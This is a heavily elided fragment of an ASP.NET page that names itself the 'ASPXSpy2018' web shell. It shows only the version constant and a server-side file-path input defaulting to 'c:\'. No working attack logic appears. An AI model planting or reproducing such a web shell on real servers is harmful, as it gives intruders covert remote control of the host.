...
<script runat="server">
	public const string Version="ASPXSpy2018";
...
<body style="margin:0;table-layout:fixed;">
 ...
 <tr>
	...
	<td style=" width:100%"><input class="input" id="Bin_TextBox_Path" value="c:\" type="text" style="width:97%;margin:0 8px;" runat="server"/>
	</td>
